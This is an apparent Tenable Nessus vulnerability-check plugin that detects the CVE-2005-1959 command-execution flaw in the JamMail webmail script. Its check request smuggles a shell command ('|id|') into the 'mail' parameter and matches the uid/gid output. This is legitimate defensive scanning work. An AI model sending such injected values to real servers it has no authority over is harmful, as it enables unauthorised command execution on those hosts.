#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");


if(description)
{
 script_id(18477);
 script_version("$Revision: 1.6 $");
 script_cve_id("CVE-2005-1959");
 script_bugtraq_id(13937);
 script_xref(name:"OSVDB", value:"17339");

 script_name(english:"JamMail jammail.pl mail Parameter Arbitrary Command Execution");
 script_summary(english:"Determines the presence of Jammail.pl remote command execution");

 script_set_attribute(
   attribute:"synopsis",
   value:string(
     "A web application running on the remote host has a command execution\n",
     "vulnerability."
   )
 );
 script_set_attribute(
   attribute:"description", 
   value:string(
     "The remote host is running JamMail, a webmail application written in\n",
     "Perl.\n\n",
     "The version of JamMail running on the remote host has an arbitrary\n",
     "command execution vulnerability.  Input to the 'mail' parameter of\n",
     "jammail.pl is not sanitized.  A remote attacker could exploit this\n",
     "to execute arbitrary commands with the privileges of the web server."
   )
 );
 script_set_attribute(
   attribute:"see_also",
   value:"http://www.securitytracker.com/alerts/2005/Jun/1014175.html"
 );
 script_set_attribute(
   attribute:"solution", 
   value:string(
     "This application is no longer maintained.  Consider using a\n",
     "different webmail product."
   )
 );
 script_set_attribute(
   attribute:"cvss_vector", 
   value:"CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P"
 );
 script_end_attributes();

 script_category(ACT_GATHER_INFO);
 script_family(english:"CGI abuses");
 
 script_copyright(english:"This script is Copyright (C) 2005-2009 Tenable Network Security, Inc.");
 
 script_dependencies("http_version.nasl");
 script_require_ports("Services/www", 80);

 exit(0);
}

include("global_settings.inc");
include("misc_func.inc");
include("http.inc");


if ( thorough_tests )
 extra_list = make_list ("/mail", "/jammail", "/cgi-bin/jammail");
else
 extra_list = NULL;

http_check_remote_code (
			extra_dirs: extra_list,
			check_request:"/jammail.pl?job=showoldmail&mail=|id|",
			extra_check:"<td width=80% height=16>uid=[0-9].* gid=[0-9].*",
			check_result:"uid=[0-9]+.*gid=[0-9]+.*",
			command:"id"
			);
